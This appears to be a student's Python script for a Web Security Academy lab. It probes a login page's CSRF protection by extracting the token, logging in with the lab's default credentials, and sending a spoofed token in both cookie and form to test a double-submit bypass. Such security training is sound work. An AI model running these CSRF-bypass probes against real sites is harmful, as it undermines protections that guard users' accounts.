import requests
from bs4 import BeautifulSoup

site = '0adf008804156c88816c3ec3009e0076.web-security-academy.net'
login_url = f'https://{site}/login'
s = requests.Session()

# Step A: Load login page and extract CSRF token from both HTML and headers
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')
print(f'[+] CSRF field in form: {csrf}')

print("[+] Response headers:")
for header in resp.headers.items():
    print(header)

print("[+] Cookies in session jar:")
for cookie in s.cookies.items():
    print(cookie)

# Step B: Clear cookies and attempt login with only the form CSRF field
s.cookies.clear()
logindata = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
resp = s.post(login_url, data=logindata)
print(f"[+] HTTP status code {resp.status_code}")
print(f"[+] Response body snippet: {resp.text[:300]}")  # Print a snippet to see what happened

# Step C: Try login with spoofed token in both cookie and form
spoofed_token = 'calizo'  # Odin ID as spoof token

logindata = {
    'csrf': spoofed_token,
    'username': 'wiener',
    'password': 'peter'
}
cookiedata = {
    'csrf': spoofed_token
}
resp = requests.post(login_url, data=logindata, cookies=cookiedata)
print(f"[+] HTTP status code: {resp.status_code}")

soup = BeautifulSoup(resp.text, 'html.parser')
returned_csrf = soup.find('input', {'name': 'csrf'}).get('value')
print(f"[+] CSRF token in HTML response is: {returned_csrf}")
